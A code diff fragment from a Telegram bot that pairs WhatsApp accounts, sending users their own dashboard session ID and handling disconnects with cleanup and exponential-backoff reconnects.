+                            `👆 You can also control this bot from the web dashboard:\n` +
+                            `${webUrl}/pair.html\n\n` +
+                            `1️⃣ Go to the site\n` +
+                            `2️⃣ Sign in / Create account\n` +
+                            `3️⃣ Paste your Session ID\n` +
+                            `4️⃣ Full dashboard access! 🚀\n\n` +
+                            `_This Session ID is your key — keep it safe._\n` +
+                            `━━━━━━━━━━━━━━━━━━━━`
+                    });
+                    // Also send to Telegram so they have it in both places
+                    try {
+                        ctx.reply(
+                            `🔑 *Your Dashboard Session ID*\n\n` +
+                            `\`\`\`${token}\`\`\`\n\n` +
+                            `You can use this to access the web dashboard at:\n${webUrl}/pair.html\n\n` +
+                            `_I also sent it to your WhatsApp self-chat._`
+                        );
+                    } catch (_) {}
+                } catch (e) {
+                    console.error("[Telegram] Failed to send session token:", e?.message);
+                }
+            }
+            console.log(`User ${userId} connected! Bot JID: ${botJids[userId]}`);
+        }
+
+        if (connection === "close") {
+            stopPresenceHeartbeat(userId);
+            const statusCode = lastDisconnect?.error?.output?.statusCode;
+            const reason = lastDisconnect?.error?.message || lastDisconnect?.error?.toString?.() || "unknown";
+            console.log(`User ${userId} disconnected (${statusCode}): ${reason}`);
+            debugLog(`[TGConn] close user=${userId} code=${statusCode || "?"} reason=${String(reason).slice(0, 300)}`);
+
+            // connectionReplaced = another WA Web session bumped us — just silently reconnect
+            if (statusCode === DisconnectReason.connectionReplaced) {
+                console.log(`User ${userId}: connection replaced — reconnecting in 6s...`);
+                await delay(6000);
+                startBot(userId, phoneNumber, ctx, true);
+                return;
+            }
+
+            const shouldNotReconnect = [
+                DisconnectReason.loggedOut,
+                DisconnectReason.forbidden,
+                DisconnectReason.badSession,
+            ].includes(statusCode);
+
+            if (shouldNotReconnect) {
+                delete activeSockets[userId];
+                delete retryCounts[userId];
+                deleteSession(userId);
+                try { removePendingJoin(userId); } catch {}
+                if (statusCode === DisconnectReason.loggedOut) {
+                    clearAuthState(userId);
+                    ctx.reply("⚠️ WhatsApp session ended. Use /pair to reconnect.");
+                }
+                return;
+            }
+
+            retryCounts[userId] = (retryCounts[userId] || 0) + 1;
+            if (retryCounts[userId] > MAX_RETRIES) {
+                delete activeSockets[userId];
+                delete retryCounts[userId];
+                ctx.reply("❌ Could not stay connected to WhatsApp. Please try /pair again.");
+                return;
+            }
+
+            // Exponential backoff: 4s → 8s → 16s → 32s → 60s (cap at 60s)
+            const backoffMs = Math.min(4000 * Math.pow(2, retryCounts[userId] - 1), 60000);
+            console.log(`User ${userId}: reconnecting (attempt ${retryCounts[userId]}/${MAX_RETRIES}) in ${backoffMs / 1000}s...`);
+            await delay(backoffMs);
+            startBot(userId, phoneNumber, ctx, true);
+        }
+    });
+}
